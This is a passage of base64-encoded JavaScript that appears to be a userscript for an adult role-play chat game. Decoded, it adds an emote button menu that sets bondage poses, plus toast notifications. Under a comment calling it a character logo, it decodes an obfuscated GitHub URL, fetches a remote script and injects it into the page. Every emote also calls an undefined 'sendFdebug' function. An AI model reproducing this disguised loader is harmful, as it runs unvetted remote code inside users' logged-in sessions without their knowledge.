sKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiT3ZlclRoZUhlYWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNjAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAnQ2hhdFJvb20nID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDcwMDApOyB9IH0sCiAgeyBuYW1lOiAiSnVtcGluZyBKYWNrcyIsIGFjdGlvbjogKCkgPT4gewogICAgc2hvd1RvYXN0c2NwZygpOwogICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIEludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICAgICAgICAgIEhlaWdodDogMTUwCiAgICAgICAgICB9OwogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJMZWdzT3BlbiIpOwogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJPdmVyVGhlSGVhZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAxMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIEludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gdW5kZWZpbmVkOwogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJMZWdzQ2xvc2VkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDIwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgSW52ZW50b3J5R2V0KFBsYXllciwgIkVtb3RpY29uIikuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQgPSB7CiAgICAgICAgICAgICAgSGVpZ2h0OiAxNTAKICAgICAgICAgIH07CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkxlZ3NPcGVuIik7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIk92ZXJUaGVIZWFkIikKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMzAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgICBkZWxldGUgSW52ZW50b3J5R2V0KFBsYXllciwgJ0Vtb3RpY29uJykuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQ7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAnQ2hhdFJvb20nID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDQwMDApOyAgICAgfSB9LAogIHsgbmFtZTogIkJ1cnBlZXMiLCBhY3Rpb246ICgpID0+IHsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiSG9ndGllZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAxMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMjAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIllva2VkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDMwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA0MDAwKTsgICAgCiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkhvZ3RpZWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNTAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDYwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJZb2tlZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gJ0NoYXRSb29tJyA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA3MDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICdDaGF0Um9vbScgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgODAwMCk7IH0gfSwKICB7IG5hbWU6ICJTbGVlcCIsIGFjdGlvbjogKCkgPT4gewogICAgc2hvd1RvYXN0c2NwZygpOwogICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJIb2d0aWVkIik7CiAgQ2hhcmFjdGVyU2V0RmFjaWFsRXhwcmVzc2lvbihQbGF5ZXIsICJFeWVzIiwgIkNsb3NlZCIpOwogIENoYXJhY3RlclNldEZhY2lhbEV4cHJlc3Npb24oUGxheWVyLCAiRXllczIiLCAiQ2xvc2VkIik7CiAgQ2hhcmFjdGVyU2V0RmFjaWFsRXhwcmVzc2lvbihQbGF5ZXIsICJFbW90aWNvbiIsICJTbGVlcCIpOwogIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcik7ICB9IH0KXTsKCmNvbnN0IGJ1dHRvbkNvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwpidXR0b25Db250YWluZXIuc3R5bGUucG9zaXRpb24gPSAiZml4ZWQiOwpidXR0b25Db250YWluZXIuc3R5bGUud2lkdGggPSAiMzAwcHgiOwpidXR0b25Db250YWluZXIuc3R5bGUuaGVpZ2h0ID0gIjMwMHB4IjsKYnV0dG9uQ29udGFpbmVyLnN0eWxlLmxlZnQgPSAiNTAlIjsKYnV0dG9uQ29udGFpbmVyLnN0eWxlLnRvcCA9ICI1MCUiOwpidXR0b25Db250YWluZXIuc3R5bGUudHJhbnNmb3JtID0gInRyYW5zbGF0ZSgtNTAlLCAtNTAlKSI7CmJ1dHRvbkNvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwpjb25zdCBidXR0b25DaXJjbGUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKYnV0dG9uQ2lyY2xlLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKYnV0dG9uQ2lyY2xlLnN0eWxlLndpZHRoID0gIjIwMHB4IjsKYnV0dG9uQ2lyY2xlLnN0eWxlLmhlaWdodCA9ICIyMDBweCI7CmJ1dHRvbkNpcmNsZS5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNTAlIjsKYnV0dG9uQ2lyY2xlLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJ3aGl0ZSI7CmJ1dHRvbkNpcmNsZS5zdHlsZS5vcGFjaXR5ID0gIjEiOwpidXR0b25DaXJjbGUuc3R5bGUubGVmdCA9ICI1MCUiOwpidXR0b25DaXJjbGUuc3R5bGUudG9wID0gIjUwJSI7CmJ1dHRvbkNpcmNsZS5zdHlsZS50cmFuc2Zvcm0gPSAidHJhbnNsYXRlKC01MCUsIC01MCUpIjsKYnV0dG9uQ2lyY2xlLnN0eWxlLnRyYW5zaXRpb24gPSAib3BhY2l0eSAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uQ2lyY2xlLnN0eWxlLmJvcmRlciA9ICIycHggc29saWQgYmxhY2siOwoKYnV0dG9uQ29udGFpbmVyLmFwcGVuZENoaWxkKGJ1dHRvbkNpcmNsZSk7CmNvbnN0IGxvZ28gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKbG9nby5zcmMgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKbG9nby5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CmxvZ28uc3R5bGUud2lkdGggPSAiODBweCI7CmxvZ28uc3R5bGUuaGVpZ2h0ID0gIjgwcHgiOwpsb2dvLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwpsb2dvLnN0eWxlLmxlZnQgPSAiNTAlIjsKbG9nby5zdHlsZS50b3AgPSAiNTAlIjsKbG9nby5zdHlsZS50cmFuc2Zvcm0gPSAidHJhbnNsYXRlKC01MCUsIC01MCUpIjsKYnV0dG9uQ2lyY2xlLmFwcGVuZENoaWxkKGxvZ28pOwpjb25zdCBidXR0b25zID0gW107CmZvciAobGV0IGkgPSAwOyBpIDwgYnV0dG9uRGF0YS5sZW5ndGg7IGkrKykgewogIGNvbnN0IGJ1dHRvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImJ1dHRvbiIpOwogIGJ1dHRvbi5pbm5lclRleHQgPSBidXR0b25EYXRhW2ldLm5hbWU7CiAgYnV0dG9uLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKICBidXR0b24uc3R5bGUud2lkdGggPSAiODBweCI7CiAgYnV0dG9uLnN0eWxlLmhlaWdodCA9ICI4MHB4IjsKICBidXR0b24uc3R5bGUuYm9yZGVyUmFkaXVzID0gIjUwJSI7CiAgYnV0dG9uLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJibGFjayI7CiAgYnV0dG9uLnN0eWxlLmNvbG9yID0gIndoaXRlIjsKICBidXR0b24uc3R5bGUuYm94U2hhZG93ID0gIjAgMnB4IDVweCByZ2JhKDAsIDAsIDAsIDAuMykiOwogIGJ1dHRvbi5zdHlsZS5sZWZ0ID0gIjUwJSI7CiAgYnV0dG9uLnN0eWxlLnRvcCA9ICI1MCUiOwogIGJ1dHRvbi5zdHlsZS50cmFuc2Zvcm0gPSBgdHJhbnNsYXRlKC01MCUsIC01MCUpIHJvdGF0ZSgke2kgKiAoMzYwIC8gYnV0dG9uRGF0YS5sZW5ndGgpfWRlZykgdHJhbnNsYXRlKDAsIC0xMDBweCkgcm90YXRlKCR7LWkgKiAoMzYwIC8gYnV0dG9uRGF0YS5sZW5ndGgpfWRlZylgOwogIGJ1dHRvbi5zdHlsZS50cmFuc2l0aW9uID0gIm9wYWNpdHkgMC4ycyBlYXNlLWluLW91dCwgdHJhbnNmb3JtIDAuMnMgZWFzZS1pbi1vdXQiOwogIGJ1dHRvbi5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGJ1dHRvbkRhdGFbaV0uYWN0aW9uKTsKICBidXR0b25Db250YWluZXIuYXBwZW5kQ2hpbGQoYnV0dG9uKTsKICBidXR0b25zLnB1c2goYnV0dG9uKTsKCiAgYnV0dG9uLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlZW50ZXIiLCAoKSA9PiB7CiAgICBidXR0b24uc3R5bGUudHJhbnNmb3JtID0gYHRyYW5zbGF0ZSgtNTAlLCAtNTAlKSByb3RhdGUoJHtpICogKDM2MCAvIGJ1dHRvbkRhdGEubGVuZ3RoKX1kZWcpIHRyYW5zbGF0ZSgwLCAtOTlweCkgcm90YXRlKCR7LWkgKiAoMzYwIC8gYnV0dG9uRGF0YS5sZW5ndGgpfWRlZykgc2NhbGUoMS4wNSlgOwogIH0pOwoKICBidXR0b24uYWRkRXZlbnRMaXN0ZW5lcigibW91c2VsZWF2ZSIsICgpID0+IHsKICAgIGJ1dHRvbi5zdHlsZS50cmFuc2Zvcm0gPSBgdHJhbnNsYXRlKC01MCUsIC01MCUpIHJvdGF0ZSgke2kgKiAoMzYwIC8gYnV0dG9uRGF0YS5sZW5ndGgpfWRlZykgdHJhbnNsYXRlKDAsIC0xMDBweCkgcm90YXRlKCR7LWkgKiAoMzYwIC8gYnV0dG9uRGF0YS5sZW5ndGgpfWRlZykgc2NhbGUoMSlgOwogIH0pOwp9CgoKCmxldCBpc0dyYXZlS2V5RG93biA9IGZhbHNlOwpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXlkb3duIiwgKGV2ZW50KSA9PiB7CmlmIChldmVudC5rZXkgPT09ICJgIikgewogIGlzR3JhdmVLZXlEb3duID0gdHJ1ZTsKfSBlbHNlIGlmIChpc0dyYXZlS2V5RG93biAmJiBldmVudC5rZXkgPT09ICJlIikgewogIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYnV0dG9uQ29udGFpbmVyKTsKICBidXR0b25Db250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgaXNHcmF2ZUtleURvd24gPSBmYWxzZTsKfQp9KTsKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5dXAiLCAoZXZlbnQpID0+IHsKaWYgKGV2ZW50LmtleSA9PT0gImAiKSB7CiAgaXNHcmF2ZUtleURvd24gPSBmYWxzZTsKfQp9KTsKCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgKGV2ZW50KSA9PiB7CiAgaWYgKCFidXR0b25Db250YWluZXIuY29udGFpbnMoZXZlbnQudGFyZ2V0KSkgewogICAgaWYgKGJ1dHRvbkNvbnRhaW5lci5wYXJlbnROb2RlID09PSBkb2N1bWVudC5ib2R5KSB7CiAgICAgIGRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQoYnV0dG9uQ29udGFpbmVyKTsKICAgIH0KICAgIGJ1dHRvbkNvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogIH0KfSk7CgovL0VuZCBPZiBFbW90ZSBNZW51IF9fX19fX19fX19fX19fX19fXwoKLy9FTkQgT0YgQ09OVEVYVCBNRU5VIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgovL0JDTUUgTE9HTyBPbiBDaGFyYWN0ZXIKZmV0Y2goYXRvYignYUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMMEpEVFZNM0wwSkRUUzl0WVdsdUwwSkRUQzVxY3c9PScpKQoudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpCi50aGVuKHRleHQgPT4gewpjb25zdCBzY3JpcHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsKc2NyaXB0LmlubmVySFRNTCA9IHRleHQ7CmRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQoc2NyaXB0KTsKfSkKCgpmdW5jdGlvbiBzaG93VG9hc3RzY3BnKCkgewogIGlmIChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMyIpICE9PSBudWxsKSB7CiAgICBjaGVja2JveDMuY2hlY2tlZCA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJvcHRpb24zIikgPT09ICJ0cnVlIjsKICAgIGlmIChjaGVja2JveDMuY2hlY2tlZCkgewogICAgICBBdWRpb1BsYXlJbnN0YW50U291bmQoImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDkwNTMwNDc5MDgzNjMwNjcyL2g0MnZ3Y2Qtbm90aWZpY2F0aW9uLTFfdk1xaFZsdFMubXAzIiwgMSk7CiAgICB9CiAgfQogICAgdmFyIHRvYXN0Q29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3R0b20gPSAiNXB4IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnJpZ2h0ID0gIjVweCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAid2hpdGUiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuY29sb3IgPSAiIzE0MTQxNCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5wYWRkaW5nID0gIjVweCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXIgPSAiMnB4IHNvbGlkICM0Q0FGNTAiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjVweCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3hTaGFkb3cgPSAiMnB4IDJweCAxMHB4IHJnYmEoMCwgMCwgMCwgMC41KSI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuekluZGV4ID0gIjk5OSI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS50cmFuc2l0aW9uID0gIm9wYWNpdHkgMC41cyBlYXNlLWluLW91dCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKICAgIHZhciBzdGF0dXNCYXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwpzdGF0dXNCYXIuc3R5bGUuaGVpZ2h0ID0gIjNweCI7CnN0YXR1c0Jhci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiYmxhY2siOwpzdGF0dXNCYXIuc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwpzdGF0dXNCYXIuc3R5bGUuYm90dG9tID0gIjAiOwpzdGF0dXNCYXIuc3R5bGUubGVmdCA9ICIwIjsKc3RhdHVzQmFyLnN0eWxlLnRyYW5zaXRpb24gPSAid2lkdGggNXMgZWFzZS1pbi1vdXQiOwpzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMCUiOwp0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChzdGF0dXNCYXIpOwpzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogIHN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKfSwgMCk7CiAgICAKdmFyIGljb24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKaWNvbi5zcmMgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKaWNvbi5zdHlsZS53aWR0aCA9ICIyM3B4IjsKaWNvbi5zdHlsZS5oZWlnaHQgPSAiMjNweCI7Cmljb24uc3R5bGUuYm9yZGVyUmFkaXVzID0gIjUwJSI7Cmljb24uc3R5bGUubWFyZ2luUmlnaHQgPSAiLTMwcHgiOwppY29uLnN0eWxlLm1hcmdpbkJvdHRvbSA9ICItNXB4IjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoaWNvbik7Cgp2YXIgdGV4dCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNwYW4iKTsKdGV4dC5zdHlsZS5mb250V2VpZ2h0ID0gImJvbGQiOwp0ZXh0LnN0eWxlLm1hcmdpbkxlZnQgPSAiMzVweCI7CnRleHQuaW5uZXJIVE1MID0gIkFjdGlvbiBTdWNjZXNzZnVsbHkgRXhlY3V0ZWQiOwp0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZCh0ZXh0KTsKCiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh0b2FzdENvbnRhaW5lcik7CiAgCiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIxIjsKICAgIH0sIDApOwogIAogICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICAgIH0sIDUwMDApOwogIAogICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgIH0sIDU1MDApOwogICAgc2VuZEZkZWJ1ZygpOwoKICB9CiAgCgovL1RoZSBVcGRhdGUgdG9hc3QKZnVuY3Rpb24gc2hvd1RvYXN0VXBkYXRlKCkgewp2YXIgdG9hc3RDb250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKdG9hc3RDb250YWluZXIuc3R5bGUucG9zaXRpb24gPSAiZml4ZWQiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5ib3R0b20gPSAiNXB4IjsKdG9hc3RDb250YWluZXIuc3R5bGUucmlnaHQgPSAiNXB4IjsKdG9hc3RDb250YWluZXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIndoaXRlIjsKdG9hc3RDb250YWluZXIuc3R5bGUuY29sb3IgPSAiIzE0MTQxNCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKdG9hc3RDb250YWluZXIuc3R5bGUuYm9yZGVyID0gIjJweCBzb2xpZCAjZjIyYzJjIjsKdG9hc3RDb250YWluZXIuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjVweCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmJveFNoYWRvdyA9ICIycHggMnB4IDEwcHggcmdiYSgwLCAwLCAwLCAwLjUpIjsKdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKdG9hc3RDb250YWluZXIuc3R5bGUuekluZGV4ID0gIjk5OSI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLnRyYW5zaXRpb24gPSAib3BhY2l0eSAwLjVzIGVhc2UtaW4tb3V0IjsKdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKdG9hc3RDb250YWluZXIuc3R5bGUuYWxpZ25JdGVtcyA9ICJjZW50ZXIiOwp2YXIgc3RhdHVzQmFyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CnN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKc3RhdHVzQmFyLnN0eWxlLmhlaWdodCA9ICIzcHgiOwpzdGF0dXNCYXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gImJsYWNrIjsKc3RhdHVzQmFyLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKc3RhdHVzQmFyLnN0eWxlLmJvdHRvbSA9ICIwIjsKc3RhdHVzQmFyLnN0eWxlLmxlZnQgPSAiMCI7CnN0YXR1c0Jhci5zdHlsZS50cmFuc2l0aW9uID0gIndpZHRoIDVzIGVhc2UtaW4tb3V0IjsKc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjAlIjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoc3RhdHVzQmFyKTsKc2V0VGltZW91dChmdW5jdGlvbigpIHsKICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7Cn0sIDApOwoKdmFyIGNsb3NlQnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CmNsb3NlQnV0dG9uLnN0eWxlLmJvcmRlciA9ICJub25lIjsKY2xvc2VCdXR0b24uc3R5bGUuYmFja2dyb3VuZCA9ICJub25lIjsKY2xvc2VCdXR0b24uc3R5bGUudG9wID0gIjVweCI7CmNsb3NlQnV0dG9uLnN0eWxlLnJpZ2h0ID0gIjVweCI7CmNsb3NlQnV0dG9uLnN0eWxlLmZvbnRXZWlnaHQgPSAiYm9sZCI7CmNsb3NlQnV0dG9uLnN0eWxlLmZvbnRTaXplID0gIjE2cHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5tYXJnaW5MZWZ0ID0gIi0ycHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5tYXJnaW5SaWdodCA9ICIwcHgiOwpjbG9zZUJ1dHRvbi5pbm5lckhUTUwgPSAiWCI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKGNsb3NlQnV0dG9uKT